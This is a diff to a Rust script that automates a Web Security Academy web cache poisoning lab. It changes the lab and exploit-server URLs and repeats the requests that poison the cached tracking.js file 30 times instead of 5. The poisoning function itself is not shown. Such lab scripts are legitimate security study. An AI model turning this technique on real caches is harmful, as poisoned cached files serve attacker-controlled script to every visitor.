@@ -23,10 +23,10 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a86006803b249a38226a22c001000db.web-security-academy.net";
+const LAB_URL: &str = "https://0a0a00cd044bb3c880319e2e00ed002e.web-security-academy.net";
 
 // Change this to your exploit server DOMAIN
-const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0a1200ba030549458279a1f4018b00f8.exploit-server.net";
+const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0aba004a0453b38c80aa9d370133009d.exploit-server.net";
 
 lazy_static! {
     static ref WEB_CLIENT: Client = build_web_client();
@@ -40,10 +40,10 @@ fn main() {
 
     println!("{}", "OK".green());
 
-    // send multiple request to cache the request
-    // 5 is enough
-    for i in 1..=5 {
-        print!("\r⦗2⦘ Poisoning the tracking.js file with multiple headers ({i}/5).. ");
+    // 5 times is enough for caching
+    // 30 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
+    for i in 1..=30 {
+        print!("\r⦗2⦘ Poisoning the tracking.js file with multiple headers ({i}/30).. ");
         flush_terminal();
 
         poison_tracking_js_file();
